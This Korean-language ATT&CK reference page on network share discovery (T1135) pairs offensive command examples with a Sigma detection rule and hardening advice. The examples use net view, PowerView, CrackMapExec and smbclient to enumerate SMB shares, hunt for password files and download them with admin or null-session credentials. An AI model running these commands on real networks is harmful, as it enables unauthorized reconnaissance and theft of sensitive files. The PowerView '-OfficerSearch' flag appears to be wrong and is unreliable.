# T1135 — Network Share Discovery

## 개요

**TA0007 / T1135**  
내부 네트워크의 SMB 공유 폴더를 열거하는 기법입니다. 공격자는 접근 가능한 공유 폴더를 찾아 민감한 데이터를 수집하거나 악성 파일을 배포하는 데 활용합니다.

---

## 동작 방식

1. 도메인 내 시스템 목록 확보 (T1018)
2. 각 시스템의 SMB 공유 폴더 열거
3. 접근 가능한 공유 폴더에서 민감 데이터 탐색
4. 파일 수집 또는 악성 페이로드 배포

---

## 주요 커맨드 / 실습

### 기본 net 명령어
```cmd
# 원격 시스템의 공유 폴더 열거
net view \\192.168.1.10
net view \\fileserver.corp.local

# 현재 시스템의 공유 폴더 확인
net share

# 현재 매핑된 네트워크 드라이브
net use
```

### PowerView
```powershell
Import-Module .\PowerView.ps1

# 도메인 내 모든 공유 폴더 열거
Find-DomainShare

# 접근 가능한 공유 폴더만 탐색
Find-DomainShare -CheckShareAccess

# 공유 폴더 내 흥미로운 파일 탐색 (패스워드, 설정 파일 등)
Find-InterestingDomainShareFile -Include *.txt,*.ini,*.xml,*.config

# 키워드로 파일 검색
Find-InterestingDomainShareFile -OfficerSearch -Terms "password","secret","admin"
```

### CrackMapExec
```bash
# 자격증명으로 공유 폴더 열거
crackmapexec smb 192.168.1.0/24 --shares -u administrator -p 'Password123!'

# 널 세션으로 공유 폴더 열거 (익명)
crackmapexec smb 192.168.1.0/24 --shares -u '' -p ''

# 공유 폴더 내 파일 목록
crackmapexec smb 192.168.1.10 -u administrator -p 'Password123!' --spider SHARE_NAME
```

### SMBClient (Linux)
```bash
# 공유 폴더 열거
smbclient -L \\192.168.1.10 -U "administrator%Password123!"

# 공유 폴더 접속
smbclient \\\\192.168.1.10\\SYSVOL -U "administrator%Password123!"

# 파일 다운로드
smbclient \\\\192.168.1.10\\C$ -U "administrator%Password123!" -c "get passwords.txt"
```

---

## 탐지 방법

### Sigma Rule
```yaml
title: Network Share Enumeration via Net View
id: e5c2a7b3-8f1d-4e6b-a9c4-3d7f2e5b8a1c
status: stable
description: Detects network share discovery using net.exe view command
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\net.exe'
        CommandLine|contains: ' view'
    condition: selection
falsepositives:
    - IT administrators performing share inventory
    - File server management scripts
level: low
tags:
    - attack.discovery
    - attack.t1135
```

---

## 대응 방안

1. 불필요한 공유 폴더 제거 및 접근 권한 최소화
2. 관리 공유(ADMIN$, C$, IPC$) 접근 모니터링
3. 공유 폴더에 민감 데이터 저장 금지 정책 수립
4. SMB 서명 활성화로 NTLM 릴레이 방지
5. EventID 5140/5145 (공유 파일 접근) 감사 로그 활성화

---

## 참고자료
- [MITRE ATT&CK T1135](https://attack.mitre.org/techniques/T1135/)
- [PowerView GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [CrackMapExec GitHub](https://github.com/byt3bl33d3r/CrackMapExec)
